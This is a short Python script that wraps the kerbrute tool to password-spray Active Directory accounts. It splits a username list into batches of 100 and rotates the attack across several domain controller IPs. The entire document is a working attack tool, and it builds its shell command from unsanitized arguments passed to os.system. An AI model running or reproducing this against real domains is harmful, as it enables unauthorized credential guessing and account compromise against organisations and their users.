import argparse
from itertools import cycle, repeat
import os

parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument('--username_file', help='username file username@domain')
parser.add_argument('--dc_ip_list', help='dc ip list')
parser.add_argument('--domain', help='domain name')
parser.add_argument('--password', help='password')
args = parser.parse_args()


with open(args.username_file) as f: 
    usernames = f.read().splitlines()
    
 
with open(args.dc_ip_list) as f: 
    dc_ip_list = f.read().splitlines()


for usernames_100, dc_ip in zip([usernames[i:i + 100] for i in range(0, len(usernames), 100)],cycle(dc_ip_list)):
    with open("users_100", "w") as outfile:
        outfile.write("\n".join(usernames_100))
    
    os.system('kerbrute passwordspray -d %s users_100 --dc %s %s >> output' % (args.domain, dc_ip, args.password))
